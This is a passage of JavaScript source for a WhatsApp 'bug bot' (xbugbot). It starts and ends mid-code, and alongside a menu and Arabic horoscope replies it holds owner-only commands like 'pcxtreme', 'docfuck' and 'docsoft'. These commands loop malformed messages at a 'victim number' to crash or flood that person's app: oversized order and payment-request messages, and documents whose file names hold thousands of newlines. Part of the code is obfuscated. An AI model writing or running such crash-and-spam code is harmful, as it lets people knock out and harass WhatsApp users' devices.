productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});XeonBotInc['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
}
}
break

case 'trollybug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${botname}`,jpegThumbnail: thumb}}}
var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": xpicvirus,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": ownername,
"orderTitle": wm, // 
"sellerJid": " 916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
XeonBotInc.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
}
}
break
case 'pcxtreme': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
num = q.split('|')[0]
amount = q.split('|')[1]
for (let i = 0; i < amount; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: XeonBotInc.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "100",
"extendedTextMessage": {
"text": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`,
}
}}), { userJid: m.chat, quoted: doc})
XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
reply(`Success in Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break

case 'docfuck': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
brutaltarget = fs.readFileSync('./XBug/cumshot.xeon')
XeonBotInc.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
}
}
break

case 'docsoft': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "${botname}",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.xeon`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
XeonBotInc.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'docsoft2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
XeonBotInc.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

case 'huehuex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`amount?\nExample: ${prefix}charbug 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
let unicornXeonxD = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `ðŸ¦„áµˆÊ³áµ‰áµƒáµ áµáµ˜Ê¸ Ë£áµ‰áµ’â¿â¸™xbugbot`, 
"jpegThumbnail": thumb
} 
} 
}
XeonBotInc.sendText(m.chat, `Xeon Ezyâ˜£ï¸`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
	           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Xeon Ezyâ˜£ï¸${text ? ': ' + text : ''}`)
            }
            break
//------------------------The End----------------------\\
///-------------------- مذكرات ترم التاني --------------\\
case 'مذكره': {
    let ownernya = ownernomer + '@s.whatsapp.net'
    let me = m.sender
    let timestampe = speed();
    let latensie = speed() - timestampe
    let xeonezy = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${ucapanWaktu} 😄
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗣𝗼𝘄𝗲𝗿𝗲𝗱 : @${ini_mark.split('@')[0]}
│𝗕𝗼𝘁 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 : @${ownernya.split('@')[0]}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  NO-PREFIX 
│𝗠𝗼𝗱𝗲 : ${XeonBotInc.public ? 'Public' : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${jumlahcmd}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 𝗧𝗼𝗱𝗮𝘆 : ${jumlahharian}
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPremium ? '✅' : `❌`}
│𝗟𝗶𝗺𝗶𝘁 : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
⳹`
    let ments = [ownernya, me, ini_mark]
    let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: 'All Menu' }, type: 1 },{ buttonId: 'command', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'SC', buttonText: { displayText: 'Script' }, type: 1 }]
    let buttonMessage = { 
        document: fs.readFileSync('./XeonMedia/file/ththt.pdf'),
        fileName : `ththt`,
        mimetype: `application/pdf`,             
        caption: xeonezy,
        footer: botname,
buttons: buttons,


}
XeonBotInc.sendMessage(m.chat, buttonMessage )
}
break
//------------------------The End----------------------\\

case 'tqtt': 
throw `Thanks to
LORD BUDDHA
Xeon (Me)
My family
And all friends who helped assemble this sexy script !!!`
break
case 'list': case 'menu': case 'help': case '?': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            let LIDOMD = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${ucapanWaktu} 😄
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗣𝗼𝘄𝗲𝗿𝗲𝗱 : @${ini_mark.split('@')[0]}
│𝗕𝗼𝘁 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 : @${ownernya.split('@')[0]}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  NO-PREFIX 
│𝗠𝗼𝗱𝗲 : ${XeonBotInc.public ? 'Public' : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${jumlahcmd}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 𝗧𝗼𝗱𝗮𝘆 : ${jumlahharian}
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPremium ? '✅' : `❌`}
│𝗟𝗶𝗺𝗶𝘁 : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
 ⳹`
            let ments = [ownernya, me, ini_mark]
            let buttons = [
                {buttonId: `owner`, buttonText: {displayText: '🐼 BYE 🐼'}, type: 1},
                {buttonId: `menu`, buttonText: {displayText: '♞ MENU ♞'}, type: 1}
            ]
            let buttonMessage = { 
                image: { url: 'https://i.ibb.co/gytytkM/images.jpg'},
                caption: LIDOMD,
                footer: botname,
                buttons: buttons,
                headerType: 4,
  }
  XeonBotInc.sendMessage(m.chat, buttonMessage )
  }
 break

 case 'tqttda': 
 throw `
 ❣️- برج الجدي: من 12/22 - الى 1/19●
❣️- برج الدلو: من 1/20 - الى 2/18●
❣️- برج الحوت: من 2/19 - الى 3/20●
❣️- برج الحمل: من 3/21 - الى 4/19●
❣️- برج الثور: من 4/20 - الى 5/20●
❣️- برج الجوزاء: من 5/21 - الى 6/20●
❣️- برج السرطان: من 6/21 - الى 7/21●
❣️- برج الاسد: من 7/23 - الى 8/22●
❣️- برج العذراء: من 8/23 - الى 9/22●
❣️- برج الميزان: من 9/23 - الى 10/22●
❣️- برج العقرب: من 10/23 - الى 11/21●
❣️- برج القوس: من 11/22 - الى 12/21●
 `
 break

 case 'ثور': case 'الثور': case 'tqdstda': 
 throw `
 برج الثور ( 20/4 - 20/5 )

الكوكب : الزهرة

أرقام الحظ : 11, 29, 29, 37, 56

الأحجار : الزمرد , الفيروز

البرج : ترابي

يتوافق مع :  برج العذراء   و برج الجدي -  برج السرطان - برج الحوت 

الأعمال الملائمة  : موظفي بنك- فنانين- محاسبين-موسيقيين- عمال

إيجابيات برج الثور : صبور- يمكن الاعتماد عليه- محب- من طبعه الإصرار والتصميم- هادئ ويحب الطمأنينة

 
 `
 break

 case 'عقرب': case 'العقرب': case 'eeffsa': 
 throw `
 برج العقرب ( 24/10 - 21/11 )

الكوكب : المريخ

ارقام الحظ : 17- 26- 35- 44-53

الاحجار : الياقوت-العقيق

البرج : مائي

يتوافق مع : برج الحوت - برج السرطان - برج الثور

الاعمال الملائمة : أطباء- محققين- علماء بيئة- مهندسين- عملاء سريين.

ايجابيات برج العقرب: صاحب عزيمة- قوي- عاطفي- ذو حدس- ذو طاقة - مثير - شخصيته جذابة- كتوم للأسرار

سلبيات برج العقرب : كثير الرفض- يحب السيطرة - محب للتملك- غيور -عنيد.
 
 `
 break

 case 'اسد': case 'الاسد': case 'eweeffsa': 
 throw `
 برج الأسد ( 23/6 - 22/8 )

الكوكب : الشمس

ارقام الحظ : 14- 13- 32-41- 50

الاحجار : الياقوت،العنبر

البرج : ناري

يتوافق مع : برج القوس - برج الحمل - برج الدلو

الاعمال الملائمة : مدراء، مهندسين معماريين، مخترعين، مدرسين، رياضيين ومدراء

ايجابيات برج الأسد : كريم، دافئ القلب، مبدع، حماسي، واسع العقل، وفي محب

 `
 break
 
 case 'قوس': case 'القوس': case 'eweeuhgt': 
 throw `
 ◍︙برج القوس
◍︙من تاريخ 2021-4-1
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
◍︙عاطفياً :  كن طويل البال مع الشريك وامنحه مزيداً من الوقت، فهو ساعدك كثيراً ويستحق منك بعض التضحية 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
◍︙صحياً :  تجنّب قدر الإمكان الأماكن الرطبة ولا سيما أنك تعاني الربو وضيقاً في التنفس
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
◍︙مهنياً :  قد يفقدك هذا اليوم الظروف المشجعة على التحرّك والاستثمار وتوظيف الأموال وتحقيق الأرباح
 
 `
 break 

 case 'حمل': case 'الحمل': case 'ewet': 
 throw `
 برج الحمل :- ( 21/3 - 19/4 )

الكوكب : المريخ

أرقام الحظ : 10 ,19, 28, 37, 46, 55

الأحجار : الياقوت - الماس

البرج : نارى

يتوافق مع :برج الاسد -برج  القوس - برج الجوزاء -برج  الدلو

الأعمال الملائمة : رجل إطفاء ، طبيب ، ميكانيكي ، طبيب أسنان ، لاعب رياضي محترف أو رجل أعمال
سلبيات برج الحمل : أناني - سريع الغضب - متهور - عديم الصبر – الطيش
  مميّزات برج الحمل ١.١ الثقة العالية بالنّفس ١.٢ روح القيادة ١.٣ الطاقة الإيجابيّة ١.٤ الشجاعة ١.٥ الإبداع ١.٦ الطّموح ١.٧ حبّ المغامرة ١.٨ الإخلاص ١.٩ الاستقلاليّة ٢ عيوب برج الحمل ٢.١ الأنانيّة ٢.٢ حبّ لفت الانتباه ٢.٣ الغضب ٢.٤ احتكار الحديث ٢.٥ التسرّع
 `
 break  

 case 'سرطان': case 'السرطان': case 'meadds': 
 throw `
 برج السرطان ( 22/6 - 22/7 )

 الكوكب : القمر
 
 ارقام الحظ : 13- 22-31-40- 48- 57
 
 الاحجار : اللؤلؤ،العنبر-الياقوت
 
 البرج : مائي
 
 يتوافق مع : برج العقرب ، برج الحوت ،برج الجدي ،برج الثور
 
 الاعمال الملائمة : أطباء، صيادلة، مدرناسا، أخصائيو تغذية، شيف، سماسرة
 
 ايجابيات برج السرطان : عاطفي، محب، صاحب حدس وبديهة، صاحب خيال واسع

 `
 break  

 case 'ميزان': case 'الميزان': case 'piaddsng': 
 throw `
 برج الميزان ( 23/9 - 23/10 )

الكوكب : الزهرة

ارقام الحظ : 6- 16- 25- 34- 43- 52

الاحجار : الماس

البرج : هوائي

يتوافق مع : برج الدلو - برج الجوزاء - برج القوس

الاعمال الملائمة : وظائف دبلوماسية- قضاة- مستشارين- أخصائيين نفسيين - فنانين

ايجابيات برج الميزان : دبلوماسي، مؤدب، رومانسي، ساحر، سهل النقياد، اجتماعي، صاحب مبادئ ومسالم

سلبيات برج الميزان : متردد، قابل للتغير، ساذج، يتأثر بسرعة، منطوي على نفسه.


 `
 break  

 case 'جدي': case 'الجدي': case 'medfdfnu': 
 throw `
 برج الجدي ( 22/12 - 19/1 )

الكوكب : زحل

ارقام الحظ: 10-28- 37-46- 55

الاحجار : العقيق اليماني

البرج : ترابي

يتوافق مع : برج الثور- برج العذراء

الاعمال الملائمة : مدراء عامين- مدراء-وزراء، -مهندسي كومبيوتر.

ايجابيات برج الجدي: عملي، عاقل- طموح- منظم- صبور- حذر- صاحب روح مرحة ومتحفظ

سلبيات برج الجدي : متشائم- متعلق بالأقدار- بائس- حاقد، متمسك بالتقاليد أكثر من اللازم وجامد.


 `
 break  

 case 'حوت': case 'الحوت': case 'meaaafdnu': 
 throw `
 برج الحوت ( 19/2 - 20/3 )

الكوكب : المشتري ارقام الحظ : 12- 21- 39- 48- 57

الاحجار : حجر القمر

البرج : مائي

يتوافق مع : برج السرطان - برج العقرب -برج الثور

الاعمال الملائمة : أطباء بيطريين- علماء أحياء- فنانين- أطباء-موسيقيين- علماء نفس

ايجابيات برج الحوت : صاحب خيال، حساس، عاطفي، لطيف، غير أناني، لا تهمه الماديات، صاحب حدس وبديهة ويتعاطف مع الآخرين.

سلبيات برج الحوت  : مثالي و يتهرب من الواقع، كتوم للأسرار وغامض، إرادته ضعيفة وسهل الانقياد.
 `
 break 

 case 'جوزاء': case 'الجوزاء': case 'Pssqwg': 
 throw `
 برج الجوزاء ( 21/5 - 20 /6 ) 

كوكب برج الجوزاء : عطارد

 أرقام الحظ  لبرج الجوزاء: 12-21-30-48-47
 
أحجار برج الجوزاء : العقيق 

نوع برج الجوزاء : هوائي

 يتوافق برج الجوزاء مع : برج الميزان - برج الحمل - برج الأسد - برج القوس

 الأعمال الملائمة لبرج الجوزاء : برامج حوارية - تجار - مك

إيجابيات  برج الجوزاء: ذكي - متقد الذهن - فصيح - لدية روح الشباب - متعدد المواهب - اجتماعي - متأقلم

سلبيات برج الجوزاء : متوتر - غير ثابت على حال - عصبي - ماكر- فضولي

 `
 break 

 case 'دلو': case 'الدلو': case 'aaPg': 
 throw `
 برج الدلو ( 20/1 - 18/2 )

الكوكب : زحل

ارقام الحظ : 11- 29- 38-47- 56

الاحجار : الفيروز

البرج : هوائي

يتوافق مع : برج الجوزاء - برج الميزان -برج الحمل -برج الجوزاء

الاعمال الملائمة برج الدلو : مخترعين- سياسيين- كتاب- علماء- رواد فضاء- منجمين

ايجابيات برج الدلو  : ودود، إنساني، صادق، وفي وصاحب ولاء، مبدئي، مبتكر

سلبيات برج الدلو : مستقل وذكي. عنيد، يقف ضد الأمور، مشاكس، غير متوقع التصرفات، غير عاطفي وله استقلاليته.
 
 `
 break

 case 'الابراج': case 'برج': {
    XeonBotInc.sendMessage(from, { react: { text: `💖`, key: m.key }}) 
    let buttons = [
        {buttonId: `tqttda`, buttonText: {displayText: '● معرفة برجك ●'}, type: 1},
        {buttonId: `tqdstda`, buttonText: {displayText: '● الثور 🐂'}, type: 1},
        {buttonId: `eeffsa`, buttonText: {displayText: '● العقرب 🦂'}, type: 2},
        {buttonId: `eweeffsa`, buttonText: {displayText: '● الاسد 🦁'}, type: 2},
        {buttonId: `eweeuhgt`, buttonText: {displayText: '● القوس 🏹'}, type: 3},
        {buttonId: `ewet`, buttonText: {displayText: '● الحمل 🐐'}, type: 3},
        {buttonId: `meadds`, buttonText: {displayText: '● السرطان 🦀'}, type: 4},
        {buttonId: `mdqsdeau`, buttonText: {displayText: '● العذراء 🦋'}, type: 4},
        {buttonId: `piaddsng`, buttonText: {displayText: '● الميزان ⚖️'}, type: 5},
        {buttonId: `medfdfnu`, buttonText: {displayText: '● الجدي 🦌'}, type: 5},
        {buttonId: `meaaafdnu`, buttonText: {displayText: '● الحوت 🐋'}, type: 6},
        {buttonId: `Pssqwg`, buttonText: {displayText: '● الجوزاء 🌩'}, type: 6},
        {buttonId: `aaPg`, buttonText: {displayText: '● الدلو 🦯'}, type: 7}
    ]
    let buttonMessage = {
    image: { url: `https://telegra.ph/file/e03731ebd0724e3135d6c.jpg` },    
